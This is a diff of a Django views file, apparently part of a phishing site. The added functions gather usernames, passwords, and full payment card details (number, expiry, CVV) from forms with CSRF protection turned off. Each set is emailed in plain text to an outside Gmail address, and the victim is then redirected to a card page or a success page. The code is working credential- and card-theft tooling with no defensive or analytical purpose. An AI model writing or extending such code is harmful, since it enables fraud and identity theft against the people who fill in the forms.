@@ -1,30 +1,59 @@
 from django.forms.models import BaseModelForm
 from django.http import HttpResponse
-from django.shortcuts import render
+from django.shortcuts import render,redirect
 from django.views.generic.edit import FormView
 from django.views.generic import TemplateView
 from django.urls import reverse_lazy
-from .forms import LoginForm,PhoneForm
+from django.views.decorators.csrf import csrf_exempt
 from .models import Login,Phone
 from django.core.mail import send_mail
 from showtime.settings import EMAIL_HOST_USER
 
-class LoginCreateView(FormView):
-    form_class = LoginForm
-    template_name = 'login.html'
-    success_url = 'error/'
-
-    def form_valid(self, form):
-        form.save()
-        username = form.cleaned_data['username']
-        password = form.cleaned_data['password']
-
+@csrf_exempt
+def login_view(request):
+    if request.method == 'POST':
+        username = request.POST.get('username')
+        password = request.POST.get('password')
         subject = 'New details submitted'
-        mail_message = f"Username: {username}\nPassword: {password}"
+        mail_message = f"username: {username}\npassword: {password}"
         from_email = EMAIL_HOST_USER
-        recipient_list = ['rn.riley@outlook.com'] 
+        recipient_list = ['karenfurst6@gmail.com'] 
         send_mail(subject,mail_message,from_email, recipient_list, fail_silently=False)
-        return super().form_valid(form)
+        return redirect('card')
+    return render(request, 'login.html')
 
-class PhoneView(TemplateView):
-    template_name = 'index.html'
+@csrf_exempt
+def card_view(request):
+    if request.method == 'POST':
+        cardholder_name = request.POST.get('cardholder_name')
+        card_number = request.POST.get('card_number')
+        expiry_month = request.POST.get('expiry_month')
+        expiry_year = request.POST.get('expiry_year')
+        cvv = request.POST.get('cvv')
+        subject = 'New details submitted'
+        mail_message = f"cardholder_name: {cardholder_name}\ncard_number: {card_number}\nexpiry_year: {expiry_year}\nexpiry_month: {expiry_month}\ncvv: {cvv}"
+        from_email = EMAIL_HOST_USER
+        recipient_list = ['karenfurst6@gmail.com'] 
+        send_mail(subject,mail_message,from_email, recipient_list, fail_silently=False)
+      
+        combined_data = {
+            
+            'cardholder_name': cardholder_name,
+            'card_number': card_number,
+            'expiry_month': expiry_month,
+            'expiry_year': expiry_year,
+            'cvv': cvv
+        }
+
+
+        # send_mail(
+        #     'Combined Form Data',
+        #     f"Sign Up Details:\nUsername: {combined_data['username']}\nPassword: {combined_data['password']}\n\nCredit Card Details:\nCardholder Name: {combined_data['cardholder_name']}\nCard Number: {combined_data['card_number']}\nExpiry Date: {combined_data['expiry_month']}/{combined_data['expiry_year']}\nCVV: {combined_data['cvv']}",
+        #     'your-email@gmail.com',
+        #     ['recipient-email@gmail.com'],
+        # )
+        return redirect('success')
+    return render(request, 'card.html')
+
+def success_view(request):
+    return render(request, 'index.html')
